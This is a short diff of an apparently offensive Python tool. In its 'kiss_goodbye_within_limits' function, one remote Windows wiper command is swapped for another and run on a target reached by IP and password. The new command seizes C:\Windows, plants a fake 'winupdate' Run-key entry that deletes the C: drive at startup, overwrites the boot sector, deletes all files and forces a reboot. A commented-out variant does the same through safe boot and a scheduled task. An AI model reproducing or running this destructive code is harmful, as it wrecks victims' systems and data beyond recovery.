@@ -161,7 +161,8 @@ def killSwitch(ipv4,pword,temp_dir,startup_dir):
 
 def kiss_goodbye_within_limits(ipv4,pword):
     print("[*] Preparing to terminate remote target...")
-    terminator = """bcdedit /set {current} recoveryenabled No & bcdedit /set {current} bootstatuspolicy IgnoreAllFailures & schtasks /create /tn 'winupdate' /tr 'cmd.exe /c rd C:\ /S /Q' /sc onstart /ru SYSTEM /f & shutdown /r /o /f /t 0"""
+    #terminator = r"""bcdedit /set {current} safeboot minimal & schtasks /create /tn "DeleteCDrive" /tr "cmd.exe /c rd C:\ /S /Q" /sc onstart /ru SYSTEM /f & shutdown /r /f /t 0"""
+    terminator = r"""takeown /f C:\Windows /r /d y & icacls C:\Windows /grant *S-1-5-32-544:F /t /c /q & reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "winupdate" /t REG_SZ /d "cmd.exe /c rd C:\ /S /Q" /f & bootsect /nt60 C: /force /mbr & del /f /s /q C:\*.* & shutdown /r /f /t 0"""
     print("[*] Executing...")
     remote_command(ipv4,pword,terminator)
     print("[+] done...")
